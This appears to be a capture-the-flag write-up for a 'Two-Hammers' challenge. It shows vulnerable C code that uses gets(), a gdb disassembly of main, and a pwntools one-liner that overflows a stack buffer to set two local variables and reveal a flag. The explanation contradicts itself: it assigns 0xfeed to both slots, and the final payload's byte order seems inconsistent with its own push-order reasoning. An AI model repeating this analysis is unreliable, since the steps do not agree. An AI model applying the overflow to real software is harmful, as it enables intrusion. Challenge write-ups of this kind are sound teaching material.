# Two-Hammers : 

In this challenge, we may analyze the c code first.

# c code : 
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gift(int a,int b)
{
	if(a==0xfade && b==0xfeed)
	{
		puts("You deserve the Mjolnir!");
		puts("Take it and unleash the power of the god of thunder!");
		FILE *fp = fopen("flag","r");
		char flag[40];
		fgets(flag,40,fp);
		printf("%31s",flag);
	}
	else
	{
		puts("Whatcha lookin for kiddo?");
		puts("This is not a toffee shop!");
		exit(0);	
	}
}
void initialize()
{
	setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
	alarm(30);
}
int main()
{
	initialize();
	puts("Hey kid!");
	puts("Wanna help Thor get his lost hammer back?");
	puts("Gimme your payload and I shall you your hammer!");
	int a=0,b=0;
	char buf[64];
	gets(buf);
	gift(a,b);
	return 0;
}
```
* from the above source code, we can understand that for the flag to get printed, a == 0xfade and b == 0xfeed
*  buffer size according to the source code is 64 bytes. However, if we take a look at main function in gdb, 

```
0x080493a7 <+18>:	push   ecx
   0x080493a8 <+19>:	sub    esp,0x50
   0x080493ab <+22>:	call   0x80491b0 <__x86.get_pc_thunk.bx>
   0x080493b0 <+27>:	add    ebx,0x2c50
   0x080493b6 <+33>:	call   0x804933e <initialize>
   0x080493bb <+38>:	sub    esp,0xc
   0x080493be <+41>:	lea    eax,[ebx-0x1f66]
   0x080493c4 <+47>:	push   eax
   0x080493c5 <+48>:	call   0x8049110 <puts@plt>
   0x080493ca <+53>:	add    esp,0x10
   0x080493cd <+56>:	sub    esp,0xc
   0x080493d0 <+59>:	lea    eax,[ebx-0x1f5c]
   0x080493d6 <+65>:	push   eax
   0x080493d7 <+66>:	call   0x8049110 <puts@plt>
   0x080493dc <+71>:	add    esp,0x10
   0x080493df <+74>:	sub    esp,0xc
   0x080493e2 <+77>:	lea    eax,[ebx-0x1f30]
   0x080493e8 <+83>:	push   eax
   0x080493e9 <+84>:	call   0x8049110 <puts@plt>
   0x080493ee <+89>:	add    esp,0x10
   0x080493f1 <+92>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080493f8 <+99>:	mov    DWORD PTR [ebp-0x10],0x0
   0x080493ff <+106>:	sub    esp,0xc
   0x08049402 <+109>:	lea    eax,[ebp-0x50]
   0x08049405 <+112>:	push   eax
   0x08049406 <+113>:	call   0x80490e0 <gets@plt>
   0x0804940b <+118>:	add    esp,0x10
   0x0804940e <+121>:	sub    esp,0x8
   0x08049411 <+124>:	push   DWORD PTR [ebp-0x10]
   0x08049414 <+127>:	push   DWORD PTR [ebp-0xc]
   0x08049417 <+130>:	call   0x8049276 <gift>
   0x0804941c <+135>:	add    esp,0x10
   0x0804941f <+138>:	mov    eax,0x0
   0x08049424 <+143>:	lea    esp,[ebp-0x8]
   0x08049427 <+146>:	pop    ecx
   0x08049428 <+147>:	pop    ebx
   0x08049429 <+148>:	pop    ebp
   0x0804942a <+149>:	lea    esp,[ecx-0x4]
   0x0804942d <+152>:	ret 
   ```
   * so from the above gdb dump, we can make out two things : 
   * buffer size is 0x50 and not 64.
   * we need to overwrite a = 0xfade and b = 0xfeed
   * variable a is stored at ebp-0xc and variable b at ebp-0x10
   * But while passing the argments to gift function, first b is pushed and then a. Due to this reverse order, while giving inputs, we need to make sure we give ebp-0xc = p32(0xfeed) and ebp-0x10 = p32(0xfeed)

# python code :
```
python -c "from pwn import *; print('A'*0x40 + p32(0xfade) + p32(0xfeed))" | ./two-hammers.chall
```
